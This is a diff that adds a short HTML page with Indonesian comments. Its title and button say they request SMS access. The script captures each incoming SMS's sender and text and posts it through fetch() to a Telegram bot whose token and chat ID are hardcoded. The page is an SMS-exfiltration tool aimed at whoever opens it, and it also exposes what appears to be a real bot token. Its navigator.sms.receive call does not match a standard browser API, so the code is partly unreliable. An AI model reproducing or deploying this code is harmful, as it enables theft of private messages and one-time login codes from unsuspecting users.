@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Akses SMS dan Kirim ke Telegram</title>
+</head>
+<body>
+  <button id="requestAccess">Minta Izin Akses SMS</button>
+  <div id="smsNotification"></div>
+
+  <script>
+    const requestAccessButton = document.getElementById('requestAccess');
+    const smsNotificationDiv = document.getElementById('smsNotification');
+    const botToken = '7280736782:AAGoQ8AfBq6EiCZ1ehzEkY5X4PlHUrGszQk'; // Ganti dengan token bot Anda
+    const chatId = '7004610211'; // Ganti dengan ID chat Telegram Anda
+
+    requestAccessButton.addEventListener('click', () => {
+      if ('sms' in navigator && 'receive' in navigator.sms) {
+        navigator.sms.receive(
+          (smsData) => {
+            const message = `SMS diterima:\nNomor: ${smsData.sender}\nIsi: ${smsData.message}`;
+            smsNotificationDiv.textContent = message;
+            sendToTelegram(message);
+          },
+          (error) => {
+            smsNotificationDiv.textContent = `Error: ${error}`;
+          }
+        );
+      } else {
+        smsNotificationDiv.textContent = "Akses SMS tidak didukung oleh browser ini.";
+      }
+    });
+
+    async function sendToTelegram(message) {
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        const data = {
+            chat_id: chatId,
+            text: message
+        };
+
+        try {
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            });
+
+            if (response.ok) {
+                console.log('Pesan terkirim ke Telegram');
+            } else {
+                console.error('Gagal mengirim pesan ke Telegram:', response.status, response.statusText);
+            }
+        } catch (error) {
+            console.error('Terjadi kesalahan:', error);
+        }
+    }
+  </script>
+</body>
+</html>
